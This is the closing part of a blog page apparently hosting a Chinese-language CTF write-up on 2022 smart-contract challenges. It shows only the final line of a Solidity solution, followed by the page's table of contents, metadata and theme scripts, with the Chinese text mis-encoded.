return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230907120740899.png" alt="image-20230907120740899"></p>
<p><em>å—¯å“¼ï¼Œæ”¶å·¥~ğŸ¤ª</em></p>

  </div>
  
  
    
    <div class='footer'>
       <!-- å‚è€ƒèµ„æ–™ã€ç›¸å…³èµ„æ–™ç­‰ -->
      
       <!-- ç›¸å…³æ–‡ç«  -->
      
      <!-- ç‰ˆæƒå£°æ˜ç»„ä»¶ -->
      
        
          
          <div class="copyright license">
            <div class="license-title">CTFProtocol-2022ï¼ˆ11ï¼‰</div>
            <div class="license-link"><a href="https://biyouqiuqiu.com/2023/09/01/Smart contracts/CTFProtocol/CTFProtocol/">https://biyouqiuqiu.com/2023/09/01/Smart contracts/CTFProtocol/CTFProtocol/</a>
            </div>
            <div class="license-meta">
              <div class="license-meta-item">
                <div class="license-meta-title">æœ¬æ–‡ä½œè€…</div>
                <div class="license-meta-text">BY_DLIFEğŸ‰</div>
              </div>
              <div class="license-meta-item">
                <div class="license-meta-title">å‘å¸ƒäº</div>
                <div class="license-meta-text">2023å¹´9æœˆ1æ—¥</div>
              </div>
              
              
              <div class="license-meta-item">
                <div class="license-meta-title">è®¸å¯åè®®</div>
                <div class="license-meta-text">ç¦æ­¢è½¬è½½å¼•ç”¨</div>
              </div>
            </div>
            <div class="license-statement">é™¤éè·å¾—åŸä½œè€…çš„å•ç‹¬æˆæƒï¼Œä»»ä½•ç¬¬ä¸‰æ–¹ä¸å¾—è½¬è½½ï¼</div>
          </div>
        
      
      <!-- æ‰“èµç»„ä»¶ -->
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          
  <div class='new-meta-item category'>
    <i class="fa-solid fa-folder fa-fw" aria-hidden="true"></i>
    <a class="category-link" href="/categories/Smart-contracts/">Smart contracts</a><span class="sep"></span><a class="category-link" href="/categories/Smart-contracts/CTFProtocol/">CTFProtocol</a>
    
      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
        <a href="/categories/Smart-contracts/" itemprop="url"><span itemprop="name">Smart contracts</span></a>
      </span>
    
      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
        <a href="/categories/Smart-contracts/CTFProtocol/" itemprop="url"><span itemprop="name">CTFProtocol</span></a>
      </span>
    
  </div>


        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/soliditiy/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>soliditiy</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>é¶åœº</p></a></div>
  <span hidden itemprop="keywords">soliditiy é¶åœº</span>


        
      
        
          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-09-01T12:50:10+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
    <p>æ›´æ–°äºï¼š2023å¹´9æœˆ1æ—¥</p>
  </a>
</div>

        
      
    </div>
    <!-- Custom Files bottomMeta begin -->
    
    <!-- Custom Files bottomMeta end -->
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/2023/09/02/Smart%20contracts/CTFProtocol/harvest_protocol_2022/'>
          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>harvest_protocol_2022</p>
          <p class='content'>
  2f6595452aee0adbb8d8a90439468713e258fd0327dbc830fd68af18f7d8f2f749965bd0e4d48f16b7b48d875cf56e...</p>
        </a>
      
      
        <a class='next' href='/2023/08/27/Smart%20contracts/ChainFlag/opcodes/opcodes(7)/'>
          <p class='title'>opcodes(7)âŒ<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>EasyAssembly1. questionæºç 
12345678910111213141516171819202122232425262728293031323334353637383940...</p>
        </a>
      
    </div>
  
  <!-- Custom Files postEnd begin-->
  
  <!-- Custom Files postEnd end-->
</article>


  


  <article class="post white-box shadow floatable blur" id="comments">
    <span hidden>
      <meta itemprop="discussionUrl" content="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/index.html#comments">
    </span>
    <p ct><i class='fa-solid fa-comments'></i> è¯„è®º</p>
    

    <div id="layoutHelper-comments"></div>

  </article>






</div>
<aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
  

  
    
    
      
    
  

  
    
    
      
<section class="widget blogger desktop mobile pjax">
  <div class='content'>
    
      
        <a class='avatar flat-box rectangle' href='/about/'>
          <img no-lazy src='https://s1.vika.cn/space/2023/08/15/bbfac9a4142e4e75871222169d8d34cb'/>
        </a>
      
    
    
      <div class='text'>
        
          <h2>BY_DLIFEğŸ‰</h2>
        
        
        
          <p><span id="jinrishici-sentence">BY_DLIFEğŸ‰</span></p>
          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="https://blog.csdn.net/qq_69410429?spm=1000.2115.3001.5343"
              class="social fa-solid fa-paper-plane flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
          
            <a href="mailto:3071709373@qq.com"
              class="social fa-solid fa-envelope flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
          
            <a href="https://github.com/LBiyou"
              class="social fab fa-github flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
          
            <a href="/"
              class="social fa-solid fa-gear flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
      </div>
    
  </div>
</section>

    
  

  
    
    
      
<section class="widget qrcode desktop mobile pjax">
  
  <header>
    
      <i class="fa-solid fa-wallet fa-fw" aria-hidden="true"></i><span class='name'>If you like, you can give a rewardã€æ‰“èµã€‘</span>
    
  </header>


  <div class='content article-entry'>
    
      <img src='https://s1.vika.cn/space/2024/03/05/881d5b6c3399410c8f169dfa9615fe74'
      
        height='200px'
      />
    
      <img src='https://s1.vika.cn/space/2024/03/05/524c058e18ad4bf09eeef5b0a5234fcf'
      
        height='200px'
      />
    
  </div>
</section>

    
  


<div class="widget-sticky pjax">

  
  


  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
    
  <header>
    
      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>æœ¬æ–‡ç›®å½•</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Lost-Kitty"><span class="toc-text">The Lost Kitty</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RootMe"><span class="toc-text">RootMe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-1"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-1"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-1"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trickster"><span class="toc-text">Trickster</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-2"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-2"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-2"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Golden-Ticket"><span class="toc-text">The Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-3"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-3"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-3"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smart-Horrocrux"><span class="toc-text">Smart Horrocrux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-4"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-4"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-4"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gas-Valve"><span class="toc-text">Gas Valve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-5"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-5"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-5"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stonks"><span class="toc-text">Stonks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-6"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-6"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-6"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pelusa"><span class="toc-text">Pelusa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-7"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-7"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-7"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phoenixtto"><span class="toc-text">Phoenixtto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-8"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-8"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-8"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mothership"><span class="toc-text">Mothership</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-9"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-9"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-9"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metaverse-Supermarket"><span class="toc-text">Metaverse Supermarket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-question-10"><span class="toc-text">1.question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-analysis-10"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-solve-10"><span class="toc-text">3. solve</span></a></li></ol></li></ol>
    </div>
  </section>

  

</div>


<!-- æ²¡æœ‰ pjax å ä½ä¼šæŠ¥é”™ ä¸‡æ¶çš„ pjax -->

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <div class="pjax">
    <!-- pjaxå ä½ -->
  </div>

  <!-- Custom Files side begin -->
  
  <!-- Custom Files side end -->
</aside>



          <!--æ­¤æ–‡ä»¶ç”¨æ¥å­˜æ”¾ä¸€äº›ä¸æ–¹ä¾¿å–å€¼çš„å˜é‡-->
<!--æ€è·¯å¤§æ¦‚æ˜¯å°†å€¼è—åˆ°é‡åŠ è½½çš„åŒºåŸŸå†…-->

<pjax>
<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  pdata.commentConfig={};
  //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
  
    // header
    var l_header=document.getElementById("l_header");
    
    l_header.classList.add("show");
    
    
      // cover
      var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
      var scroll_down=document.getElementById('scroll-down');
      cover_wrapper.id="none";
      cover_wrapper.style.display="none";
      scroll_down.style.display="none";
    
  
</script>
</pjax>
        </div>
        
  
  <footer class="footer clearfix"  itemscope itemtype="http://schema.org/WPFooter">
    <br><br>
    
      
        <div class='copyright'>
        <p><span>Â© 2018 - 2023 </span><span> BY_DLIFEğŸ‰</span></p>

        </div>
      
    
      
        
          <div><p>æ”¿ç­– Â· ç»Ÿè®¡ | æœ¬ç«™ä½¿ç”¨ <a href="https://volantis.js.org/" target="_blank">Volantis</a> ä¸»é¢˜è®¾è®¡</p>
</div>
        
      
    
      
        <br>
        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
          
            
              <a href="/"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer" itemprop="url">
                
              </a>
            
          
            
              <a href="mailto:3071709373@.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer" itemprop="url">
                
              </a>
            
          
            
              <a href="https://github.com/LBiyou"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer" itemprop="url">
                
              </a>
            
          
        </div>
      
    
    <!-- Custom Files footer begin-->
    
    <!-- Custom Files footer end-->
  </footer>


        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" href="/" onclick="return false;" title="top"></a>
      </div>
    </div>
    <div>
      <script>
  /******************** volantis.dom ********************************/
  // é¡µé¢é€‰æ‹©å™¨ å°†domå¯¹è±¡ç¼“å­˜èµ·æ¥ see: /source/js/app.js etc.
  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // é¡µé¢ä¸»ä½“
  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // å‘ä¸Š
  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // æ•´ä¸ªå¯¼èˆªæ 
  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1ä¸ª
  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // æœç´¢æŒ‰é’®   ç§»åŠ¨ç«¯ 1ä¸ª
  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // ç§»åŠ¨ç«¯å¯¼èˆªæ 
  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // æœç´¢æ¡† æ¡Œé¢ç«¯ ç§»åŠ¨ç«¯ 1ä¸ª
  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  æ‰‹æœºç«¯ å­èœå• å¤šä¸ª
</script>

<script>
  
  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fortawesome/fontawesome-free/css/all.min.css");
  
  
  
</script>

<!-- required -->


<!-- internal -->

<script src="/js/app.js"></script>





  













<div id="rightmenu-wrapper">
  <ul class="list-v rightmenu" id="rightmenu-content">
    
  <li class='navigation menuNavigation-Content'>


    <a class="nav icon-only fix-cursor-default" onclick="history.back()"><i class="fa-solid fa-arrow-left fa-fw"></i></a>



    <a class="nav icon-only fix-cursor-default" onclick="history.forward()"><i class="fa-solid fa-arrow-right fa-fw"></i></a>



    <a class="nav icon-only fix-cursor-default" onclick="window.location.reload()"><i class="fa-solid fa-redo fa-fw"></i></a>



    <a class="nav icon-only fix-cursor-default" onclick="VolantisApp.scrolltoElement(volantis.dom.bodyAnchor)"><i class="fa-solid fa-arrow-up fa-fw"></i></a>


  </li>


    <hr class="menuLoad-Content" >



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyPaste" data-event="copyPaste" data-group="inputBox">
      <i class="fa-solid fa-paste fa-fw"></i>
      ç²˜è´´æ–‡æœ¬
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyAll" data-event="copyAll" data-group="inputBox">
      <i class="fa-solid fa-object-ungroup fa-fw"></i>
      å…¨é€‰æ–‡æœ¬
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyCut" data-event="copyCut" data-group="inputBox">
      <i class="fa-solid fa-cut fa-fw"></i>
      å‰ªåˆ‡æ–‡æœ¬
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyText" data-event="copyText" data-group="seletctText">
      <i class="fa-solid fa-copy fa-fw"></i>
      å¤åˆ¶æ–‡æœ¬
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="searchWord" data-event="OpenSearch(__text__)" data-group="seletctText">
      <i class="fa-solid fa-search fa-fw"></i>
      ç«™å†…æœç´¢
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="bingSearch" data-event="window.open(`https://cn.bing.com/search?q=${__text__}`)" data-group="seletctText">
      <i class="fa-solid fa-search fa-fw"></i>
      å¿…åº”æœç´¢
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="openTab" data-event="window.open(__link__)" data-group="elementCheck">
      <i class="fa-solid fa-external-link-square-alt fa-fw"></i>
      æ–°æ ‡ç­¾é¡µæ‰“å¼€
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyLink" data-event="copyLink" data-group="elementCheck">
      <i class="fa-solid fa-link fa-fw"></i>
      å¤åˆ¶é“¾æ¥åœ°å€
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="copyImg" data-event="copyImg" data-group="elementImage">
      <i class="fa-solid fa-image fa-fw"></i>
      å¤åˆ¶å›¾ç‰‡
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="googleImg" data-event="window.open(`https://www.google.com.hk/searchbyimage?image_url=${__link__}`)" data-group="elementImage">
      <i class="fa-solid fa-images fa-fw"></i>
      è°·æ­Œè¯†å›¾
    </span>
  </li>



  <li class="menuLoad-Content">
    <a class="vlts-menu fix-cursor-default" id="help" target="_blank" rel="noopener" href="https://volantis.js.org/faqs/" data-group="link">
      <i class="fa-solid fa-question fa-fw"></i>
      å¸¸è§é—®é¢˜
    </a>
  </li>



  <li class="menuLoad-Content">
    <a class="vlts-menu fix-cursor-default" id="source_docs" target="_blank" rel="noopener" href="https://github.com/LBiyou/LBiyou.github.io" data-group="link">
      <i class="fa-solid fa-code-branch fa-fw"></i>
      æœ¬ç«™æºç 
    </a>
  </li>



    <hr class="menuLoad-Content" >



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="darkMode" data-event="volantis.dark.toggle()" data-group="darkMode">
      <i class="fa-solid fa-moon fa-fw"></i>
      å¤œé—´æ¨¡å¼
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="printMode" data-event="printMode" data-group="articlePage">
      <i class="fa-solid fa-print fa-fw"></i>
      æ‰“å°é¡µé¢
    </span>
  </li>



  <li class="menuLoad-Content">
    <span class="vlts-menu fix-cursor-default event" id="readMode" data-event="readMode" data-group="articlePage">
      <i class="fa-solid fa-book-open fa-fw"></i>
      é˜…è¯»æ¨¡å¼
    </span>
  </li>


<div id="menuMusic">
  <li class='music name menuOption-Content'>
    <p class='nav music-title fix-cursor-default'></p>
  </li>
  <li class='music ctrl'>
    <a class='nav icon-only backward fix-cursor-default' href="/" onclick="return false;" title="backward">
      <i class='fa-solid fa-step-backward fa-fw'></i>
    </a>
    <a class='nav icon-only toggle fix-cursor-default' href="/" onclick="return false;" title="toggle">
      <i class='fa-solid fa-play fa-fw'></i>
    </a>
    <a class='nav icon-only forward fix-cursor-default' href="/" onclick="return false;" title="forward">
      <i class='fa-solid fa-step-forward fa-fw'></i>
    </a>
  </li>
  <li class='music volume'>
    <div class='nav volume'>
      <div class="aplayer-volume-bar-wrap">
        <div class="aplayer-volume-bar fix-cursor-pointer">
          <div class="aplayer-volume"></div>
          <i class='left fa-solid fa-volume-off fa-fw'></i>
          <i class='right fa-solid fa-volume-up fa-fw'></i>
        </div>
      </div>
    </div>
  </li>
</div>

  </ul>
</div>
<script src="/js/plugins/rightMenus.js"></script>
<script>
  const RightMenusFunction = {};
  












  //RightMenusFunction['copyPaste'] = (fun) => {fun()}





  //RightMenusFunction['copyAll'] = (fun) => {fun()}





  //RightMenusFunction['copyCut'] = (fun) => {fun()}





  //RightMenusFunction['copyText'] = (fun) => {fun()}





  RightMenusFunction['searchWord'] = (__text__) => {OpenSearch(__text__)}





  RightMenusFunction['bingSearch'] = (__text__) => {window.open(`https://cn.bing.com/search?q=${__text__}`)}





  RightMenusFunction['openTab'] = (__link__) => {window.open(__link__)}





  //RightMenusFunction['copyLink'] = (fun) => {fun()}





  //RightMenusFunction['copyImg'] = (fun) => {fun()}





  RightMenusFunction['googleImg'] = (__link__) => {window.open(`https://www.google.com.hk/searchbyimage?image_url=${__link__}`)}











  RightMenusFunction['darkMode'] = () => {volantis.dark.toggle()}





  //RightMenusFunction['printMode'] = (fun) => {fun()}





  //RightMenusFunction['readMode'] = (fun) => {fun()}





</script>



<!-- rightmenuè¦åœ¨darkmodeä¹‹å‰ï¼ˆToggleButtonï¼‰ darkmodeè¦åœ¨commentsä¹‹å‰ï¼ˆvolantis.dark.pushï¼‰-->

  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "color-scheme";
const rootElementDarkModeAttributeName = "color-scheme";
const setLS = (k, v) => {
    localStorage.setItem(k, v);
};
const removeLS = (k) => {
    localStorage.removeItem(k);
};
const getLS = (k) => {
    return localStorage.getItem(k);
};
const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};
const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};
const validColorModeKeys = {
  dark: true,
  light: true,
};
const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);
  getCustomDarkMode();
  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};
const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};
/**
 * get target mode
 */
 const getCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  if(currentSetting=="dark"){
    volantis.dark.mode="light";
  }else{
    volantis.dark.mode="dark";
  }
  // console.log(volantis.dark.mode)
};
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};
/**
 * æš—é»‘æ¨¡å¼è§¦å‘å™¨
 */
volantis.dark.toggle=()=>{
  const mode = toggleCustomDarkMode();
  applyCustomDarkModeSettings(mode);
  // ä½¿ç”¨ volantis.dark.push æ–¹æ³•ä¼ å…¥volantis.dark.toggleå›è°ƒå‡½æ•° å‚è§layout/_partial/scripts/global.ejs
  volantis.dark.method.toggle.start();
}
/**
 * bind event for toggle button
 */

function bindToggleButton() {
  var btn= document.querySelectorAll("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn")
  btn.forEach(function (e) {
    volantis.dom.$(e).on('click',volantis.dark.toggle);
  })
}
applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", ()=>{
  volantis.requestAnimationFrame(bindToggleButton)
});
volantis.pjax.push(bindToggleButton);

const darkModelListeners={
  dark:(mediaQueryList )=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "dark";
    }
    volantis.dark.method.toggle.start();
  },
  light:(mediaQueryList)=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "light";
    }
    volantis.dark.method.toggle.start();
  }
}
window.matchMedia('(prefers-color-scheme: dark)').addListener(darkModelListeners.dark)
window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListeners.light)
</script>




<script>
  function loadIssuesJS() {
    
      const sites_api = document.getElementById('sites-api');
      if (sites_api != undefined && typeof SitesJS === 'undefined') {
        volantis.js("/js/plugins/tags/sites.js")
      }
    
    
      const friends_api = document.getElementById('friends-api');
      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
        volantis.js("/js/plugins/tags/friends.js")
      }
    
    
      const contributors_api = document.getElementById('contributors-api');
      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
        volantis.js("/js/plugins/tags/contributors.js")
      }
    
  };
  loadIssuesJS()
  volantis.pjax.push(()=>{
    loadIssuesJS();
  })

</script>






  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: ["#"],
	maxRPS: 6,
	hoverDelay: 0
  };
</script>
<script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/flying-pages/flying-pages.min.js"></script>







  <script>
  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/aplayer/dist/APlayer.min.css");
  (async () => {
    // APlayer éœ€è¦åœ¨  MetingJS ä¹‹å‰åŠ è½½
    await volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/aplayer/dist/APlayer.min.js")
    await volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/meting/dist/Meting.min.js")
  
    // å³é”® music éœ€è¦åœ¨ APlayer  MetingJS ä¹‹ååŠ è½½
    await volantis.js('/js/plugins/aplayer.js')
  
  })();

  function SetAPlayerPlugin(){
    let Metings = document.querySelectorAll('meting-js');
    if (Metings.length === 0) {return;};
    if (Metings[0].aplayer && Metings[0].aplayer.on) {
      // improve the accessibility https://web.dev/button-name/
      document.querySelectorAll(".aplayer-icon-menu").forEach(e=>{
        e.setAttribute("aria-label","Aplayer Menu")
      })
      // message see: /layout/_plugins/message/script.ejs
      
        try {
          setTimeout(() => {
            Metings.forEach((item, index) => {
              const aplayerItem = item.aplayer; if(!aplayerItem) return;
              const rightAplayerCheck = 'true' === 'true'
                && item.meta.id === '8913002428';
              if(rightAplayerCheck && typeof RightMenuAplayer !="undefined") RightMenuAplayer.checkAPlayer();
              if(aplayerItem.events.events.play.every(item => {return item.name !== 'messagePlay'})) {
                aplayerItem.on('play', function messagePlay() {
                  let index = aplayerItem.list.index;
                  let title = aplayerItem.list.audios[index].title;
                  let artist = aplayerItem.list.audios[index].artist;
                  setTimeout(() => {
                    VolantisApp.message('éŸ³ä¹é€šçŸ¥', title + ' - ' + artist, {
                      icon: 'fa-solid fa-play',
                      transitionIn: 'flipInX',
                      transitionOut: 'flipOutX'
                    });
                  }, 100)
                });
              }
              if(aplayerItem.events.events.pause.every(item => {return item.name !== 'messagePause'})) {
                aplayerItem.on('pause', function messagePause() {
                  let index = aplayerItem.list.index;
                  let title = aplayerItem.list.audios[index].title;
                  let artist = aplayerItem.list.audios[index].artist;
                  setTimeout(() => {
                    // æ­Œæ›²æ’­æ”¾ç»“æŸä¹Ÿä¼šè§¦å‘ pause äº‹ä»¶ï¼Œä¸ºäº†é¿å…é”™è¯¯æç¤ºï¼Œç­‰å¾…ä¸€ä¼šå„¿
                    if(aplayerItem.paused) {
                      VolantisApp.message('éŸ³ä¹é€šçŸ¥', title + ' - ' + artist, {
                        icon: 'fa-solid fa-pause',
                        transitionIn: 'flipInX',
                        transitionOut: 'flipOutX'
                      });
                    }
                  }, 100)
                });
              }
            });
          }, 500)
        } catch (error) { console.error(error); }
      
    }else{
      volantis.requestAnimationFrame(SetAPlayerPlugin)
    }
  }

  document.addEventListener("DOMContentLoaded", ()=>{
    SetAPlayerPlugin();
  });
  volantis.pjax.push(SetAPlayerPlugin);
</script>




      <script>
  volantis.layoutHelper("comments",`<div id="giscus_container"></div>`)

  volantis.giscus = {};

  function check_giscus() {
    if (volantis.dark.mode === "dark") {
      volantis.giscus.Theme = 'dark';
    } else {
      volantis.giscus.Theme = 'light';
    }

    return document.getElementById("giscus_container");
  }

  function pjax_giscus() {
    const HEAD = check_giscus();
    if (!HEAD) return;
    let cfg = Object.assign({"theme":{"light":"light","dark":"dark"},"repo":"LBiyou/blog_comments","repo-id":"R_kgDOJfOxQg","category":"Announcements","category-id":"DIC_kwDOJfOxQs4CW34_","mapping":"pathname","reactions-enabled":"1","emit-metadata":"0","lang":"zh-CN"},pdata.commentConfig)
